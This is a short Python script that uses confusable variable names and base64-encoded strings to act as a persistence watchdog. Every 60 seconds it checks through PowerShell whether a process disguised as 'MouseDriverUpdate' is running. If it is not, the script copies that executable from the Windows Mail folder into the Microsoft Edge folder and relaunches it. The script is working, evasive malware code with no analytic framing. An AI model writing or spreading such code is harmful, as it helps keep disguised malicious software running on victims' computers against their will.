import subprocess
import base64
import os 
import time 

def power_run(cmd):
    completed = subprocess.run(["powershell", "-Command", cmd], capture_output=False, close_fds=True)
    return completed
def LLLLLLLLLllllllllllllllLLlllll(LLLLLLLLLlllllllllllllllLLllll): 
    LLLLLLLLLlllllllllllllllLLllll = base64.b64decode(LLLLLLLLLlllllllllllllllLLllll)
    return LLLLLLLLLlllllllllllllllLLllll.decode()

LLLLLLLLllllllllllllllllLLllll=LLLLLLLLLllllllllllllllLLlllll("QzpcUHJvZ3JhbSBGaWxlcyAoeDg2KVxNaWNyb3NvZnRcRWRnZVxNb3VzZURyaXZlclVwZGF0ZS5leGU=") # C:\Program Files (x86)\Microsoft\Edge\MouseDriverUpdate.exe
LLLLLLLLllllllllllllllLLllllll=LLLLLLLLLllllllllllllllLLlllll("TW91c2VEcml2ZXJVcGRhdGU=") # MouseDriverUpdate

LLLLLLLLlllllllllllllllllLLllll = LLLLLLLLLllllllllllllllLLlllll("R2V0LVByb2Nlc3MgLU5hbWU=") # Get-Process -Name
LLLLLLLLLllllllllllllllllLLllll = LLLLLLLLLllllllllllllllLLlllll("ID4gUHJvY2Vzc2VzLnR4dA==") #  > Processes.txt
LLLLLLLLllllllllllllllllLLlllll = LLLLLLLLlllllllllllllllllLLllll + " " + LLLLLLLLllllllllllllllLLllllll + LLLLLLLLLllllllllllllllllLLllll # Get-Process -Name MouseDriverUpdate > Processes.txt
LLLLLLLLllllllllllllllLLlllllll = LLLLLLLLLllllllllllllllLLlllll("QzpcUHJvZ3JhbSBGaWxlc1xXaW5kb3dzIE1haWxcTW91c2VEcml2ZXJVcGRhdGUuZXhl") # C:\Program Files\Windows Mail\MouseDriverUpdate.exe
while True:
    power_run(LLLLLLLLllllllllllllllllLLlllll) # Get-Process -Name MouseDriverUpdate > Processes.txt
    LLLLLLLLlllllllllllllllllLLllll = LLLLLLLLLllllllllllllllLLlllll("UHJvY2Vzc2VzLnR4dA==") # Processes.txt
    LLLLLLLLlllllllllllllllllLLllll = os.getcwd() + "\\" + LLLLLLLLlllllllllllllllllLLllll
    LLLLLLLLLllllllllllllllllLLllll = os.path.getsize(LLLLLLLLlllllllllllllllllLLllll) # Processes.txt file size (check if MouseDriverUpdate running)
    if LLLLLLLLLllllllllllllllllLLllll == 0:
        command = "copy " + LLLLLLLLllllllllllllllLLlllllll + " " + LLLLLLLLllllllllllllllllLLllll # copy C:\Program Files\Windows Mail\MouseDriverUpdate.exe C:\Program Files (x86)\Microsoft\Edge\MouseDriverUpdate.exe
        os.system(command)
        subprocess.Popen([LLLLLLLLllllllllllllllllLLllll], close_fds=True) # C:\Program Files (x86)\Microsoft\Edge\MouseDriverUpdate.exe
    time.sleep(60)